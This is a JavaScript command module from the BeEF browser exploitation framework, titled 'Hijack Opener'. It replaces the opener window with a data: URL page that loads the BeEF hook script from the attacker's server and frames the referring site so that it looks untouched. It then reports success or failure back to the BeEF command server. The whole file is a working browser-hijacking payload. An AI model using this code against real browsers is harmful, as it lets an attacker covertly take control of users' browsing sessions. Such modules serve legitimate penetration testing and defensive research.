//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {
  var referrer = document.referrer;
  var hook = beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+beef.net.hook;
  try {
    beef.debug("[Hijack Opener] Trying to hijack: " + referrer);
    window.opener.location = 'data:text/html,<html><head><title>'+referrer+'</title><script src="'+hook+'"></'+'script><style>body {padding:0;margin:0}</style></head><body><iframe src="'+referrer+'" style="width:100%;height:100%;margin:0;padding:0;border:0"></iframe></body>';
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "success=hijacked window.opener.location", beef.are.status_success());
  } catch (e) {
    beef.debug("[Hijack Opener] could not hijack opener window: "+e.message)
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=could not hijack opener window: " + e.message, beef.are.status_error());
  }
});
